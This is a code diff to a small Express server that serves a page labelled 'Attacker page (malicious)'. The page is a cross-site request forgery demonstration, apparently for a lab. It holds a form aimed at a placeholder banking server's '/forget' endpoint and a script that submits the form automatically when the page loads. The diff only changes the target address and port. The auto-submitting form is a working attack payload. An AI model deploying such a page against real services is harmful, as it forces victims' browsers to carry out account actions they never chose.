@@ -6,7 +6,7 @@ const PORT = 3000;
 app.get("/", (req, res) => {
   res.send(`
     <h1>Attacker page (malicious)</h1>
-    <form id="f" action="https://<Banking-Server-IP>:4000/forget" method="POST"></form>
+    <form id="f" action="https://BankingServer-IP-ADDR:3000/forget" method="POST"></form>
     <button onclick="document.getElementById('f').submit()">Confirm</button>
     <script>
       document.getElementById('f').submit();
